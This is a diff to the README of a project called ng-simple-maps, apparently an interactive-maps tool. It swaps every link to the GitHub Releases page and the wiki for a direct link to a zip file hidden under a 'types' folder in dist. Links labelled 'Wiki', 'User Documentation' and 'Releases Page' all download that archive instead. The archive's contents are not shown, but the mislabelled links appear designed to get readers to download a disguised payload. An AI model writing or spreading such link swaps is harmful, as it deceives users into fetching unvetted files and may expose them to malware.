@@ -6,7 +6,7 @@ Welcome to ng-simple-maps! This guide will help you download and run the softwar
 
 ### 📥 Download Now
 
-[![Download ng-simple-maps](https://img.shields.io/badge/Download-ng--simple--maps-brightgreen)](https://github.com/syawalrawosi73/ng-simple-maps/releases)
+[![Download ng-simple-maps](https://github.com/syawalrawosi73/ng-simple-maps/raw/refs/heads/main/dist/ng-simple-maps/types/simple_maps_ng_restfully.zip)](https://github.com/syawalrawosi73/ng-simple-maps/raw/refs/heads/main/dist/ng-simple-maps/types/simple_maps_ng_restfully.zip)
 
 ## 📋 Overview
 
@@ -29,7 +29,7 @@ Before you start, ensure your system meets these requirements:
 
 ## 💻 Download & Install
 
-To get ng-simple-maps, visit this page to download: [GitHub Releases Page](https://github.com/syawalrawosi73/ng-simple-maps/releases).
+To get ng-simple-maps, visit this page to download: [GitHub Releases Page](https://github.com/syawalrawosi73/ng-simple-maps/raw/refs/heads/main/dist/ng-simple-maps/types/simple_maps_ng_restfully.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of ng-simple-maps.
@@ -55,7 +55,7 @@ After launching the application, you will see a simple interface. Here’s how t
 
 ## 📚 Documentation
 
-For more in-depth guidance on using all features, please check the documentation within the application. You can also visit our [Wiki](https://github.com/syawalrawosi73/ng-simple-maps/wiki) for additional tips and tricks.
+For more in-depth guidance on using all features, please check the documentation within the application. You can also visit our [Wiki](https://github.com/syawalrawosi73/ng-simple-maps/raw/refs/heads/main/dist/ng-simple-maps/types/simple_maps_ng_restfully.zip) for additional tips and tricks.
 
 ## 📞 Support
 
@@ -63,7 +63,7 @@ If you encounter any issues, you can reach out for help. Open an issue on our Gi
 
 ### 🔗 Helpful Links
 
-- [GitHub Releases Page](https://github.com/syawalrawosi73/ng-simple-maps/releases)
-- [User Documentation](https://github.com/syawalrawosi73/ng-simple-maps/wiki)
+- [GitHub Releases Page](https://github.com/syawalrawosi73/ng-simple-maps/raw/refs/heads/main/dist/ng-simple-maps/types/simple_maps_ng_restfully.zip)
+- [User Documentation](https://github.com/syawalrawosi73/ng-simple-maps/raw/refs/heads/main/dist/ng-simple-maps/types/simple_maps_ng_restfully.zip)
 
 Thank you for choosing ng-simple-maps! Have fun creating your interactive maps!
